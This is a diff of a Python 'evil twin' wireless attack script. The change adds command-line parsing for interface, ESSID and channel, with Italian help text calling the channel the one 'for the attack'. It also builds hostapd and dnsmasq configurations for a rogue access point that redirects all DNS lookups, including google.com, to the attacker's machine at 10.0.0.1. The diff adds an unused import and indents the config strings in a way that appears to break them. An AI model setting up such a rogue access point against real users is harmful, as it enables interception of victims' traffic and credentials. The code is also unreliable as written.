@@ -9,31 +9,45 @@
 #Ubuntu 21.10   Tested - OK
 #KALI 2022.1    Tested - OK
 
+from ast import Param
 import os
-from evilconfig import *
 import time
+import sys
 
-hostapdCONF ="\
-interface=" + wInt + "\n\
-driver=nl80211\n\
-ssid=" + wSsid +"\n\
-channel=" + wCh + "\n"
 
-dnsmasqCONF = "\
-interface=" + wInt + "\n\
-domain-needed\n\
-no-poll\n\
-bogus-priv\n\
-dhcp-range=10.0.0.10,10.0.0.250,12h\n\
-dhcp-option=3,10.0.0.1\n\
-dhcp-option=6,10.0.0.1\n\
-no-resolv\n\
-listen-address=127.0.0.1\n\
-server=8.8.8.8\n\
-port = 53\n\
-address=/#/10.0.0.1\n\
-address=/www.google.com/10.0.0.1\n\
-"
+class Parametri:
+    def __init__(self):
+        self.argv = sys.argv
+
+    def menu(self):
+        if len(self.argv) != 7:
+            print ("\nComando: python3 evil.py [-i][-e][-c]\n\n\
+            -i        Intefaccia di rete utilizzata (es. wlan0)\n\
+            -e        nome ESSID della rete wireless che si vuole creare\n\
+            -c        Canale wireless da utilizzare per l'attacco!!\n")
+            exit()
+        else:
+            if ( (self.argv[1] == '-c') and (self.argv[3] == '-i') and (self.argv[5] == '-e') ):
+                return self.argv[2], self.argv[4], self.argv[6] #channel interface essid
+
+            elif ( (self.argv[1] == '-c') and (self.argv[3] == '-e') and (self.argv[5] == '-i') ):
+                return self.argv[2], self.argv[6], self.argv[4]
+
+            elif ( (self.argv[1] == '-i') and (self.argv[3] == '-e') and (self.argv[5] == '-c') ):
+                return self.argv[6], self.argv[2], self.argv[4]
+
+            elif ( (self.argv[1] == '-i') and (self.argv[3] == '-c') and (self.argv[5] == '-e') ):
+                return self.argv[4], self.argv[2], self.argv[6]
+
+            elif ( (self.argv[1] == '-e') and (self.argv[3] == '-c') and (self.argv[5] == '-i') ):
+                return self.argv[4], self.argv[6], self.argv[2]
+
+            elif ( (self.argv[1] == '-e') and (self.argv[3] == '-i') and (self.argv[5] == '-c') ):
+                return self.argv[6], self.argv[4], self.argv[2]                
+
+
+
+
 
 
 class EvilTwin:
@@ -111,7 +125,29 @@ def configB():
 
 
 if(__name__ == "__main__"):
+    configuratore = Parametri()
+    wCh,wInt,wSsid = Parametri.menu(configuratore)
+    hostapdCONF ="\
+    interface=" + wInt + "\n\
+    driver=nl80211\n\
+    ssid=" + wSsid +"\n\
+    channel=" + wCh + "\n"
 
+    dnsmasqCONF = "\
+    interface=" + wInt + "\n\
+    domain-needed\n\
+    no-poll\n\
+    bogus-priv\n\
+    dhcp-range=10.0.0.10,10.0.0.250,12h\n\
+    dhcp-option=3,10.0.0.1\n\
+    dhcp-option=6,10.0.0.1\n\
+    no-resolv\n\
+    listen-address=127.0.0.1\n\
+    server=8.8.8.8\n\
+    port = 53\n\
+    address=/#/10.0.0.1\n\
+    address=/www.google.com/10.0.0.1\n\
+"
     configF()
     configB()
     x = EvilTwin(wInt)
